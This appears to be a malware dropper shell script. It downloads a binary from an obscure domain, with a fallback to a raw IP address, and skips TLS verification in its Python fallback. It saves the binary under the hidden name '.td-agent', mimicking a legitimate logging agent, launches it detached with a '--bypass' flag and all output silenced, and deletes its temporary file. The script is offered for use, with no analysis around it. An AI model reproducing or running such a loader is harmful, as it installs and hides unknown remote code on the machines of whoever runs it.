#!/bin/sh
U="https://123872.xyz/Q1fc8a9OCb7AsC6f/dl/73bcc7a5-b34d-42e2-b142-8a301ca41337"
U2="http://130.94.37.220/agent_dl.bin"
T="${TMPDIR:-/tmp}/.cache_$$$RANDOM"
fetch() { url="$1"; if command -v curl >/dev/null 2>&1; then curl -fsL -m180 "$url" -o "$T" 2>/dev/null; elif command -v wget >/dev/null 2>&1; then wget -q -T180 -O "$T" "$url" 2>/dev/null; else python3 -c "import ssl,urllib.request as u,sys;open(sys.argv[2],'wb').write(u.urlopen(sys.argv[1],context=ssl._create_unverified_context(),timeout=180).read())" "$url" "$T" 2>/dev/null; fi; }
fetch "$U"; SZ=$(wc -c < "$T" 2>/dev/null || echo 0)
if [ "$SZ" -lt 100000 ]; then fetch "$U2"; SZ=$(wc -c < "$T" 2>/dev/null || echo 0); fi
[ "$SZ" -gt 100000 ] || exit 1
chmod +x "$T" 2>/dev/null || exit 1
D=/var/tmp; [ -w "$D" ] || D=/tmp
cp "$T" "$D/.td-agent" 2>/dev/null; chmod +x "$D/.td-agent" 2>/dev/null
rm -f /tmp/.td-agent.lock 2>/dev/null
if command -v setsid >/dev/null 2>&1; then setsid nohup "$D/.td-agent" --bypass >/dev/null 2>&1 </dev/null & else nohup "$D/.td-agent" --bypass >/dev/null 2>&1 </dev/null & fi
rm -f "$T" 2>/dev/null
exit 0
